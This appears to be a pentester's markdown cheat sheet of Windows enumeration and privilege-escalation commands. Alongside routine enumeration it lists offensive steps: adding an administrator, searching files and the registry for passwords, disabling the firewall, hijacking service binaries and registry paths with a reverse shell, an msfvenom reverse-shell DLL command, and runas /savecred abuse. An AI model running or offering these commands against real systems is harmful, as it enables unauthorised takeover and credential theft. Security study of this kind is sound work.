# Useful Windows Enumeration Commands
## Users, Groups, Networking
- `echo %USERNAME%`
- list local admins
    - `net localgroup "Administrators"`
- add a user to the administrators' group
    - `net localgroup Administrators <username> /add`
- ARP table
    - `arp -a`
- Routing table
    - route print`
- `ipconfig /all`
- listening ports
    - `netstat -an | findstr LISTENING`
- PSA: `NT AUTHORITY\INTERACTIVE` is a psuedo-group for all user that can log on to the system locally

##  OS/Arch
- Get OS version
    - `ver`

## Domain commands
- `net user /domain`
- `net group /domain`
- list shares
    - `net share`
- list Password Policy
    - `net accounts /domain`

## Processes/Applications
- list remote processes/services
    - `tasklist /svc`
## Enumerating files & directories
- search files for passwords
    - `findstr /si password *.txt | *.xml | *.xls | *.ini`
- search files with pass in the name, or a config file
    - `dir /s *pass* == *.config`
- tree of C drive
    - `tree /F /A c:\ > tree.txt`
- search for all PDFs
    - `dir /a /s /b c:\*.pdf*`
- use accesschk to enumerate permissions of a file/dir
    -  `.\accesschk.exe /accepteula -uwdq "C:\Program Files\ Unquoted Path Service\"`

# Services
- show services 
    - `sc query state=all`
- query the configuration of a service
    - `sc qc <service-name>`
- query the current status of a service
    - `sc query <service-name>`
- modify the config option of a service
    - `sc config <service-name> <option>= <value>`
- start/stop a service
    - `net start/stop <service-name>`
- use accesschk to check user permissions on a service
    - `.\accesschk.exe /accepteula -uwcqv <user> <service-name>`
        - look for `SERVICE_CHANGE_CONFIG` and `SERVICE_START/SERVICE_STOP`

# Registry
- check a registry entry's ACL using powershell
    - `Get-Acl HKLM:\System\CurrentControlSet\Services\{service} | Format-List`
- check a registry entry's access using accesschk
    - `.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\{service}` 
        - `KEY_ALL_ACCESS` means full access
- check current values in registry entry
    - `reg query HKLM\SYSTEM\CurrentControlSet\services\{service}`
    - ObjectName will tell you what privs the service runs as
- change a registry config to point to a reverse shell executable
    - `reg add HKLM\SYSTEM\CurrentControlSet\services\{service} /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f` 
    - flags/values may differ, consult [documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-add) for specific cases
- search registry for a password
    - `reg query HKLM /f password /t REG_SZ /s` - system
    - `reg query HKCU /f password /t REG_SZ /s` - user
- query registry for autorun programs
    - `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run `

# Other
- disable firewall
    - `netsh advfirewall set currentprofile state off`
    - `netsh advfirewall set allprofiles state off`
- DNS zone transfer
    - `nslookup, set type=any, ls -d domain > results.txt, exit`
- overwrite a service executable with a reverse shell
    - `copy /Y C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" `
- create a reverse shell DLL 
    - `msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip-address} LPORT={port} -f dll -o hijackme.dll`
- search for saved credentials & exploit them
    - `cmdkey /list`
    - `runas /savecred /user:{user} C:\PrivEsc\reverse.exe `
